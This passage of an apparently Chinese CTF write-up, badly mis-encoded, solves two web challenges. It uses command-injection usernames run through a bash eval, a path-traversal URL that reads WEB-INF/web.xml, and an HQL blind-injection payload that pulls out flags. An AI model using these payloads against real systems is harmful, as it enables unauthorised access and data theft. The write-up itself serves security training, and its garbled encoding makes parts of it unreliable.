Â Â Â Â Â Â Â Â Â Â Â <span class="comment">#Â also,Â ourÂ extensionÂ needsÂ toÂ beÂ .wtf</span></span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â [[Â <span class="variable">$Â </span>=Â $&#123;line01&#125;Â &amp;&amp;Â $&#123;can_execute&#125;Â =Â <span class="number">0</span>Â ]];</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â is_script=$;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">#Â executeÂ theÂ line.</span></span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">if</span>Â [[Â <span class="variable">$is_scriptÂ </span>=Â <span class="number">0</span>Â ]]</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â then</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â cmd+=$<span class="string">&#x27;n&#x27;</span>$&#123;line<span class="comment">#$&#125;;</span></span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">else</span></span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">if</span>Â [[Â -nÂ <span class="variable">$cmdÂ </span>]]</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â then</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">eval</span>Â <span class="variable">$cmdÂ Â logÂ ErrorÂ duringÂ executionÂ of</span>Â $&#123;cmd&#125;;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â cmd=</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â fi</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">echo</span>Â <span class="variable">$line</span></span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â fi</span><br><span class="line">Â Â Â Â Â Â Â Â doneÂ Â $&#123;pathname&#125;</span><br><span class="line">Â Â Â Â <span class="keyword">else</span></span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">echo</span>Â pMaxÂ <span class="keyword">include</span>Â depthÂ exceeded!p</span><br><span class="line">Â Â Â Â fi</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»§ç»­è§‚å¯Ÿï¼Œå‘ç°replyå‡½æ•°ä¹Ÿå­˜åœ¨è·¯å¾„ç©¿è¶Šæ¼æ´ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>Â <span class="title">reply</span>Â </span>&#123;</span><br><span class="line">Â Â Â Â localÂ post_id=$<span class="number">1</span>;</span><br><span class="line">Â Â Â Â localÂ username=$<span class="number">2</span>;</span><br><span class="line">Â Â Â Â localÂ text=$<span class="number">3</span>;</span><br><span class="line">Â Â Â Â localÂ hashed=$(hash_usernameÂ <span class="string">&quot;$&#123;username&#125;&quot;</span>);</span><br><span class="line">Â Â Â Â curr_id=$(<span class="keyword">for</span>Â dÂ inÂ posts/$&#123;post_id&#125;<span class="comment">/*;Â doÂ basenameÂ $d;Â doneÂ |Â sortÂ -nÂ |Â tailÂ -nÂ 1);</span></span><br><span class="line"><span class="comment">Â Â Â Â next_reply_id=$(awkÂ &#x27;&#123;printÂ $1+1&#125;&#x27;Â &lt;&lt;&lt;Â &quot;$&#123;curr_id&#125;&quot;);</span></span><br><span class="line"><span class="comment">Â Â Â Â next_file=(posts/$&#123;post_id&#125;/$&#123;next_reply_id&#125;);</span></span><br><span class="line"><span class="comment">Â Â Â Â echoÂ &quot;$&#123;username&#125;&quot;Â &gt;Â &quot;$&#123;next_file&#125;&quot;;</span></span><br><span class="line"><span class="comment">Â Â Â Â echoÂ &quot;RE:Â $(nth_lineÂ 2Â &lt;Â &quot;posts/$&#123;post_id&#125;/1&quot;)&quot;Â &gt;&gt;Â &quot;$&#123;next_file&#125;&quot;;</span></span><br><span class="line"><span class="comment">Â Â Â Â echoÂ &quot;$&#123;text&#125;&quot;Â &gt;&gt;Â &quot;$&#123;next_file&#125;&quot;;</span></span><br><span class="line"><span class="comment">Â Â Â Â #Â addÂ postÂ thisÂ isÂ inÂ replyÂ toÂ toÂ postsÂ cache</span></span><br><span class="line"><span class="comment">Â Â Â Â echoÂ &quot;$&#123;post_id&#125;/$&#123;next_reply_id&#125;&quot;Â &gt;&gt;Â &quot;users_lookup/$&#123;hashed&#125;/posts&quot;;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢æ ‡è®°çš„ä¸€è¡Œä»£ç æŠŠç”¨æˆ·åå†™åœ¨äº†è¯„è®ºæ–‡ä»¶çš„å†…å®¹ä¸­ã€‚</p><p>ç»“åˆä¸Šé¢ä¸¤æ®µä»£ç å’Œé»„è‰²é‡ç‚¹æ ‡è®°çš„éƒ¨åˆ†ï¼Œæˆ‘ä»¬å¯ä»¥æ¨æµ‹å¦‚æœç”¨æˆ·åæ˜¯ä¸€æ®µå¯æ‰§è¡Œä»£ç ï¼ŒåŒæ—¶å†™å…¥wtfæ ¼å¼æ–‡ä»¶ï¼Œé‚£ä¹ˆè¿™ä¸ªæ–‡ä»¶å°±èƒ½å¤Ÿæ‰§è¡Œæˆ‘ä»¬æƒ³è¦çš„ä»£ç ã€‚</p><p>ç”±å¾—åˆ°å‰åŠæ®µflagçš„æ–‡ä»¶get_flag1æ¨æµ‹ï¼ŒååŠæ®µflagçš„æ–‡ä»¶ååº”ä¸ºget_flag2ï¼Œäºæ˜¯æˆ‘ä»¬å…ˆæ³¨å†Œä¸€ä¸ªç”¨æˆ·åä¸º<code>\$&#123;find,/,-iname,get_flag2&#125;</code>çš„æ™®é€šç”¨æˆ·ï¼Œç”¨æ¥å¯»æ‰¾æ‰€æœ‰ç›®å½•ä¸‹çš„get_flag2æ–‡ä»¶ã€‚ç„¶åæˆ‘ä»¬æµ‹è¯•ä¸€ä¸‹å‰é¢æåˆ°çš„æ–‡ä»¶ä¸Šä¼ æ¼æ´ã€‚å°†postè·¯å¾„æ”¹ä¸ºå¦‚ä¸‹æ‰€ç¤ºï¼Œä¸Šä¼ åä¸ºtest1.wtfçš„æ–‡ä»¶ï¼Œåœ¨è¿™é‡Œæ–‡ä»¶çš„å†…å®¹æ²¡æœ‰æ„ä¹‰ï¼Œæ‰§è¡Œçš„æ˜¯USERNAMEï¼Œå³<code>\$&#123;find,/,-iname,get_flag2&#125;</code>ï¼Œç”¨æ¥å¯»æ‰¾flag2è·¯å¾„.</p><p><img src="/img/88f14ee2803cedf895270ab6bbcba866.png"></p><p>ä¸Šä¼ æˆåŠŸåæˆ‘ä»¬æ‰“å¼€è¿™ä¸ªæ–‡ä»¶ï¼Œå¯ä»¥å¾—åˆ°flag2çš„è·¯å¾„ï¼š</p><p><img src="/img/10f2caf48d231a51678cb63b027d0a2a.png"></p><p>ä¸‹é¢æˆ‘ä»¬åˆ©ç”¨è¿™ä¸ªè·¯å¾„å¾—åˆ°flag2ã€‚æ³¨å†Œä¸€ä¸ªåä¸º<code>\$/usr/bin/get_flag2</code>çš„ç”¨æˆ·ï¼Œåˆ©ç”¨ä»¥ä¸Šæ–¹æ³•ä¸Šä¼ attack.wtfæ–‡ä»¶ï¼š</p><p><img src="/img/b20da88afa4c44ee711c4fa029f64677.png"></p><p>æ‰“å¼€è¯¥æ–‡ä»¶ï¼Œå¾—åˆ°flag2ã€‚</p><p><img src="/img/e0a3e915117dbf6eabbb3ec1d970468b.png"></p><p>æ‹¼æ¥flag1å’Œflag2å¾—åˆ°xctf{cb49256d1ab48803149e5ec49d3c29ca}.</p><h2 id="Zhuanxv-ï¼ˆéš¾åº¦ï¼š7-10ï¼‰"><a href="#Zhuanxv-ï¼ˆéš¾åº¦ï¼š7-10ï¼‰" class="headerlink" title="Zhuanxv ï¼ˆéš¾åº¦ï¼š7/10ï¼‰"></a>Zhuanxv ï¼ˆéš¾åº¦ï¼š7/10ï¼‰</h2><p>ç»“åˆé¢˜ç›®æè¿°ä¸­çš„â€œä½ åªæ˜¯åœ¨æ‰«æç›®æ ‡ç«¯å£çš„æ—¶å€™å‘ç°äº†ä¸€ä¸ªå¼€æ”¾çš„webæœåŠ¡â€ï¼Œä½¿ç”¨webdirscanå·¥å…·æ‰«æä¸€ä¸‹ï¼Œå¾—åˆ°ä»¥ä¸‹ç»“æœï¼š</p><p><img src="/img/fcc72f547692369aa6041d550264c158.png"></p><p>æ‰“å¼€<a href="http://111.200.241.244:59982/list%E5%8F%AF%E4%BB%A5%E5%BE%97%E5%88%B0%E4%B8%80%E4%B8%AA%E7%99%BB%E5%BD%95%E7%95%8C%E9%9D%A2%EF%BC%9A">http://111.200.241.244:59982/listå¯ä»¥å¾—åˆ°ä¸€ä¸ªç™»å½•ç•Œé¢ï¼š</a></p><p><img src="/img/2d67ecd7dce7fce58e1717ffd986c0c7.png"></p><p>ä»”ç»†å®¡é˜…ä»£ç ï¼Œå‘ç°ç–‘ä¼¼æ–‡ä»¶åŒ…å«æ¼æ´ï¼š</p><p><img src="/img/784206267500573fb86da08696200745.png"></p><p>åŒæ—¶å‘ç°cookieä¸­å«æœ‰<code>JESSIONID</code>å­—æ®µï¼š</p><p><img src="/img/18d717345b071e4c35e43f27b361c724.png"></p><p>äºæ˜¯æ€€ç–‘è¯¥ç½‘é¡µæ‰€ç”¨è¯­è¨€ä¸ºJavaï¼Œäºæ˜¯æˆ‘ä»¬å°è¯•åˆ©ç”¨ä¸Šé¢çš„æ–‡ä»¶åŒ…å«æ¼æ´å¯»æ‰¾web.xmlé¡µé¢ã€‚æ„é€ payloadä¸º<code>http://111.200.241.244:59982/loadimage?fileName=../../WEB-INF/web.xml</code>ï¼Œè®¿é—®ï¼Œå¾—åˆ°bg.jpgï¼Œç”¨è®°äº‹æœ¬æ‰“å¼€ï¼Œå¯ä»¥å¾—åˆ°æºä»£ç ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xmlÂ version=&quot;1.0&quot;Â encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span>Â <span class="attr">id</span>=<span class="string">&quot;WebApp_9&quot;</span>Â <span class="attr">version</span>=<span class="string">&quot;2.4&quot;</span></span></span><br><span class="line"><span class="tag">Â Â Â Â Â Â Â Â Â <span class="attr">xmlns</span>=<span class="string">&quot;http://java.sun.com/xml/ns/j2ee&quot;</span></span></span><br><span class="line"><span class="tag">Â Â Â Â Â Â Â Â Â <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">Â Â Â Â Â Â Â Â Â <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd&quot;</span>&gt;</span></span><br><span class="line">Â Â Â Â <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>StrutsÂ Blank<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">Â Â Â Â <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">Â Â Â Â Â Â Â Â <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">Â Â Â Â Â Â Â Â <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">Â Â Â Â <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">Â Â Â Â <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">Â Â Â Â Â Â Â Â <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">Â Â Â Â Â Â Â Â <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">Â Â Â Â <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">Â Â Â Â <span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">Â Â Â Â Â Â Â Â <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>/ctfpage/index.jsp<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">Â Â Â Â <span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">Â Â Â Â <span class="tag">&lt;<span class="name">error-page</span>&gt;</span></span><br><span class="line">Â Â Â Â Â Â Â Â <span class="tag">&lt;<span class="name">error-code</span>&gt;</span>404<span class="tag">&lt;/<span class="name">error-code</span>&gt;</span></span><br><span class="line">Â Â Â Â Â Â Â Â <span class="tag">&lt;<span class="name">location</span>&gt;</span>/ctfpage/404.html<span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line">Â Â Â Â <span class="tag">&lt;/<span class="name">error-page</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å‘ç°strust2æ–‡ä»¶ï¼Œå³Struts2æ¡†æ¶çš„å…¨å±€å±æ€§æ–‡ä»¶ï¼Œåˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´è®¿é—®è¯¥æ–‡ä»¶ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xmlÂ version=&quot;1.0&quot;Â encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line">Â </span><br><span class="line"><span class="meta">&lt;!DOCTYPEÂ <span class="meta-keyword">struts</span>Â <span class="meta-keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta">Â Â Â Â Â Â Â Â <span class="meta-string">&quot;-//ApacheÂ SoftwareÂ Foundation//DTDÂ StrutsÂ ConfigurationÂ 2.3//EN&quot;</span></span></span><br><span class="line"><span class="meta">Â Â Â Â Â Â Â Â <span class="meta-string">&quot;http://struts.apache.org/dtds/struts-2.3.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line">Â Â Â Â <span class="tag">&lt;<span class="name">constant</span>Â <span class="attr">name</span>=<span class="string">&quot;strutsenableDynamicMethodInvocation&quot;</span>Â <span class="attr">value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">Â Â Â Â <span class="tag">&lt;<span class="name">constant</span>Â <span class="attr">name</span>=<span class="string">&quot;struts.mapper.alwaysSelectFullNamespace&quot;</span>Â <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>Â /&gt;</span></span><br><span class="line">Â Â Â Â <span class="tag">&lt;<span class="name">constant</span>Â <span class="attr">name</span>=<span class="string">&quot;struts.action.extension&quot;</span>Â <span class="attr">value</span>=<span class="string">&quot;,&quot;</span>/&gt;</span></span><br><span class="line">Â Â Â Â <span class="tag">&lt;<span class="name">package</span>Â <span class="attr">name</span>=<span class="string">&quot;front&quot;</span>Â <span class="attr">namespace</span>=<span class="string">&quot;/&quot;</span>Â <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span></span><br><span class="line">Â Â Â Â Â Â Â Â <span class="tag">&lt;<span class="name">global-exception-mappings</span>&gt;</span></span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="tag">&lt;<span class="name">exception-mapping</span>Â <span class="attr">exception</span>=<span class="string">&quot;java.lang.Exception&quot;</span>Â <span class="attr">result</span>=<span class="string">&quot;error&quot;</span>/&gt;</span></span><br><span class="line">Â Â Â Â Â Â Â Â <span class="tag">&lt;/<span class="name">global-exception-mappings</span>&gt;</span></span><br><span class="line">Â Â Â Â Â Â Â Â <span class="tag">&lt;<span class="name">action</span>Â <span class="attr">name</span>=<span class="string">&quot;zhuanxvlogin&quot;</span>Â <span class="attr">class</span>=<span class="string">&quot;com.cuitctf.action.UserLoginAction&quot;</span>Â <span class="attr">method</span>=<span class="string">&quot;execute&quot;</span>&gt;</span></span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="tag">&lt;<span class="name">result</span>Â <span class="attr">name</span>=<span class="string">&quot;error&quot;</span>&gt;</span>/ctfpage/login.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="tag">&lt;<span class="name">result</span>Â <span class="attr">name</span>=<span class="string">&quot;success&quot;</span>&gt;</span>/ctfpage/welcome.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">Â Â Â Â Â Â Â Â <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">Â Â Â Â Â Â Â Â <span class="tag">&lt;<span class="name">action</span>Â <span class="attr">name</span>=<span class="string">&quot;loadimage&quot;</span>Â <span class="attr">class</span>=<span class="string">&quot;com.cuitctf.action.DownloadAction&quot;</span>&gt;</span></span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="tag">&lt;<span class="name">result</span>Â <span class="attr">name</span>=<span class="string">&quot;success&quot;</span>Â <span class="attr">type</span>=<span class="string">&quot;stream&quot;</span>&gt;</span></span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="tag">&lt;<span class="name">param</span>Â <span class="attr">name</span>=<span class="string">&quot;contentType&quot;</span>&gt;</span>image/jpeg<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="tag">&lt;<span class="name">param</span>Â <span class="attr">name</span>=<span class="string">&quot;contentDisposition&quot;</span>&gt;</span>attachment;filename=&quot;bg.jpg&quot;<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="tag">&lt;<span class="name">param</span>Â <span class="attr">name</span>=<span class="string">&quot;inputName&quot;</span>&gt;</span>downloadFile<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="tag">&lt;<span class="name">result</span>Â <span class="attr">name</span>=<span class="string">&quot;suffix_error&quot;</span>&gt;</span>/ctfpage/welcome.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">Â Â Â Â Â Â Â Â <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">Â Â Â Â <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line">Â Â Â Â <span class="tag">&lt;<span class="name">package</span>Â <span class="attr">name</span>=<span class="string">&quot;back&quot;</span>Â <span class="attr">namespace</span>=<span class="string">&quot;/&quot;</span>Â <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span></span><br><span class="line">Â Â Â Â Â Â Â Â <span class="tag">&lt;<span class="name">interceptors</span>&gt;</span></span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="tag">&lt;<span class="name">interceptor</span>Â <span class="attr">name</span>=<span class="string">&quot;oa&quot;</span>Â <span class="attr">class</span>=<span class="string">&quot;com.cuitctf.util.UserOAuth&quot;</span>/&gt;</span></span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="tag">&lt;<span class="name">interceptor-stack</span>Â <span class="attr">name</span>=<span class="string">&quot;userAuth&quot;</span>&gt;</span></span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="tag">&lt;<span class="name">interceptor-ref</span>Â <span class="attr">name</span>=<span class="string">&quot;defaultStack&quot;</span>Â /&gt;</span></span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="tag">&lt;<span class="name">interceptor-ref</span>Â <span class="attr">name</span>=<span class="string">&quot;oa&quot;</span>Â /&gt;</span></span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="tag">&lt;/<span class="name">interceptor-stack</span>&gt;</span></span><br><span class="line">Â </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="tag">&lt;/<span class="name">interceptors</span>&gt;</span></span><br><span class="line">Â Â Â Â Â Â Â Â <span class="tag">&lt;<span class="name">action</span>Â <span class="attr">name</span>=<span class="string">&quot;list&quot;</span>Â <span class="attr">class</span>=<span class="string">&quot;com.cuitctf.action.AdminAction&quot;</span>Â <span class="attr">method</span>=<span class="string">&quot;execute&quot;</span>&gt;</span></span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="tag">&lt;<span class="name">interceptor-ref</span>Â <span class="attr">name</span>=<span class="string">&quot;userAuth&quot;</span>&gt;</span></span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="tag">&lt;<span class="name">param</span>Â <span class="attr">name</span>=<span class="string">&quot;excludeMethods&quot;</span>&gt;</span></span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â execute</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="tag">&lt;/<span class="name">interceptor-ref</span>&gt;</span></span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="tag">&lt;<span class="name">result</span>Â <span class="attr">name</span>=<span class="string">&quot;login_error&quot;</span>&gt;</span>/ctfpage/login.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="tag">&lt;<span class="name">result</span>Â <span class="attr">name</span>=<span class="string">&quot;list_error&quot;</span>&gt;</span>/ctfpage/welcome.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="tag">&lt;<span class="name">result</span>Â <span class="attr">name</span>=<span class="string">&quot;success&quot;</span>&gt;</span>/ctfpage/welcome.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">Â Â Â Â Â Â Â Â <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">Â Â Â Â <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ–‡ä»¶é‡ŒåŒ…å«äº†å¾ˆå¤šclassåï¼Œä½¿ç”¨æ–‡ä»¶åŒ…å«æ¼æ´å¯ä»¥é€ä¸ªä¸‹è½½ã€‚ä¸‹è½½åå°†æ–‡ä»¶æ‰©å±•åæ”¹ä¸º.classï¼Œç”¨<code>jd-gui</code> javaåç¼–è¯‘å·¥å…·è¿›è¡Œåç¼–è¯‘ï¼š</p><p><img src="/img/03edafc996c93920d2f0236ac05286fa.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span>Â <span class="keyword">boolean</span>Â <span class="title">userCheck</span><span class="params">(UserÂ user)</span>Â </span>&#123;</span><br><span class="line">Â List&lt;User&gt;Â userListÂ =Â <span class="keyword">this</span>.userService.loginCheck(user.getName(),Â user.getPassword());</span><br><span class="line">Â <span class="keyword">if</span>Â (userListÂ !=Â <span class="keyword">null</span>Â &amp;&amp;Â userList.size()Â ==Â <span class="number">1</span>)Â &#123;</span><br><span class="line">Â Â Â <span class="keyword">return</span>Â <span class="keyword">true</span>;</span><br><span class="line">Â &#125;</span><br><span class="line">Â addActionError(<span class="string">&quot;UsernameÂ orÂ passwordÂ isÂ Wrong,Â pleaseÂ check!&quot;</span>);</span><br><span class="line">Â <span class="keyword">return</span>Â <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>Â ListÂ &lt;User&gt;Â loginCheck(StringÂ name,Â StringÂ password)Â &#123;</span><br><span class="line">Â Â Â Â nameÂ =Â name.replaceAll(<span class="string">&quot;Â &quot;</span>,Â <span class="string">&quot;&quot;</span>);</span><br><span class="line">Â Â Â Â nameÂ =Â name.replaceAll(<span class="string">&quot;=&quot;</span>,Â <span class="string">&quot;&quot;</span>);</span><br><span class="line">Â Â Â Â MatcherÂ username_matcherÂ =Â Pattern.compile(<span class="string">&quot;^[0-9a-zA-Z]+$&quot;</span>).matcher(name);</span><br><span class="line">Â Â Â Â MatcherÂ password_matcherÂ =Â Pattern.compile(<span class="string">&quot;^[0-9a-zA-Z]+$&quot;</span>).matcher(password);</span><br><span class="line">Â Â Â Â <span class="keyword">if</span>Â (password_matcher.find())Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">return</span>Â <span class="keyword">this</span>.userDao.loginCheck(name,Â password);</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line">Â Â Â Â <span class="keyword">return</span>Â <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>Â ListÂ &lt;Â UserÂ &gt;Â loginCheck(StringÂ name,Â StringÂ password)Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â <span class="keyword">return</span>Â getHibernateTemplate().find(<span class="string">&quot;fromÂ UserÂ whereÂ nameÂ =&#x27;&quot;</span>Â +Â nameÂ +Â <span class="string">&quot;&#x27;Â andÂ passwordÂ =Â &#x27;&quot;</span>Â +Â passwordÂ +Â <span class="string">&quot;&#x27;&quot;</span>);Â Â </span><br><span class="line">Â Â Â &#125;</span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šä»£ç ç‰‡æ®µæ˜¯åç¼–è¯‘åå¾—åˆ°çš„ç™»å½•å’Œç”¨æˆ·æ ¡éªŒçš„ä»£ç ï¼Œç»“åˆä»¥ä¸Šä»£ç å¯ä»¥æ„é€ payloadï¼š<code>(select%0Aascii(substr(id,&quot;+str(i)+&quot;,1))%0Afrom%0AFlag%0Awhere%0Aid\&lt;2)\&lt;&#39;&quot;+str(j)+&quot;&#39;</code>ä»¥åŠURLï¼šâ€<code>%0Aor%0Aname%0Alike%0A&#39;admin&amp;user.password=1</code>â€œï¼Œä½¿ç”¨è„šæœ¬è¿›è¡Œç›²æ³¨ï¼Œå¾—åˆ°flagï¼š<code>sctf&#123;C46E250926A2DFFD831975396222B08E&#125;</code>ã€‚</p><p><img src="/img/e612afe02edb8e93583c659b2d7359dd.png"></p><h2 id="blgdel-ï¼ˆéš¾åº¦ï¼š8-10ï¼‰"><a href="#blgdel-ï¼ˆéš¾åº¦ï¼š8-10ï¼‰" class="headerlink" title="blgdel ï¼ˆéš¾åº¦ï¼š8/10ï¼‰"></a>blgdel 